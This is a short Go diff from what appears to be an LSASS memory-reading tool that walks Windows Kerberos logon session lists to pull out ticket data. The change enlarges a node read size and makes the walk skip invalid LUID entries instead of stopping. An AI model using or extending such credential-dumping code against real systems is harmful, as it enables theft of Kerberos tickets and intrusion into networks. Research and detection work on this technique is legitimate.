@@ -172,7 +172,7 @@ var kerbSessionLayouts = []kerbSessionLayout{
 		Tickets1Off:  0x110,
 		Tickets2Off:  0x120,
 		Tickets3Off:  0x130,
-		NodeReadSize: 0x148,
+		NodeReadSize: 0x200,
 	},
 	{
 		// Win10 1607-1803 / Server 2016 (KIWI_KERBEROS_LOGON_SESSION_10_1607)
@@ -403,11 +403,13 @@ func walkKerbSessionList(r lsassReader, tableBase uintptr, sessLayout kerbSessio
 
 			session := parseKerbSession(r, buf, sessionBase, sessLayout)
 
-			// Validate: LUID HighPart should be 0 (LowPart can be large on
-			// long-running systems — e.g., 0x8C5C50B for a batch logon).
-			// An address-like value (e.g., 0x7FFC...) means garbage data.
+			// Skip entries with garbage LUID (high 32 bits set = likely an address).
+			// Don't break — there may be valid entries after this one.
 			if session.LUID>>32 != 0 {
-				break // high 32 bits non-zero — likely an address, not a LUID
+				leOff := sessLayout.ListEntryOff
+				flink := uintptr(binary.LittleEndian.Uint64(buf[leOff : leOff+8]))
+				cursor = flink
+				continue
 			}
 
 			session.Raw = buf
